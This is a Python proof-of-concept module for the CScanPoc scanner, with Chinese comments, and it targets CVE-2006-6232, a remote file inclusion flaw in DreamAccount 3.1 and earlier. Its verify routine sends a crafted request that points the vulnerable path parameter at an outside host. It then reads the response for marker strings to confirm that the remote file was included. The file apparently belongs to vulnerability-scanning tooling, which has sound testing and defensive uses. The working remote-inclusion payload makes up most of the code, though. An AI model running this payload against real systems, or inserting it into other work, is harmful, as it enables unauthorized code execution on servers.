# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'DreamAccount_0000'  # 平台漏洞编号
    # 漏洞名称
    name = 'DreamAccount <= 3.1 (Authentication.api.php) Remote File Include Exploit'
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RFI  # 漏洞类型
    disclosure_date = '2006-12-01'  # 漏洞公布时间
    desc = '''
    DreamAccount是一款基于PHP的成员管理程序。
    DreamAccount实现上存在输入验证漏洞，远程攻击者可能利用此漏洞在服务器上执行任意命令。
    DreamAccount的/admin/index.php脚本没有对path变量做充分地检查过滤，远程攻击者可能利用此漏洞使脚本包含远程服务器上的代码执行。
    DreamAccount <= 3.1 (Authentication.api.php)远程文件包含漏洞。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2006-4837'  # 漏洞来源
    cnvd_id = 'CNVD-2006-4837'  # cnvd漏洞编号
    cve_id = 'CVE-2006-6232'  # cve编号
    product = 'DreamAccount'  # 漏洞组件名称
    product_version = '<= 3.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '088f56fc-529b-45f3-8f61-c142cf320fbb'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/Authentication.api.php?path=http://www.sqlsec.com/admin.html'
            response = requests.get(vul_url).text
            if 'Baiduspider' in response or 'Googlebot' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
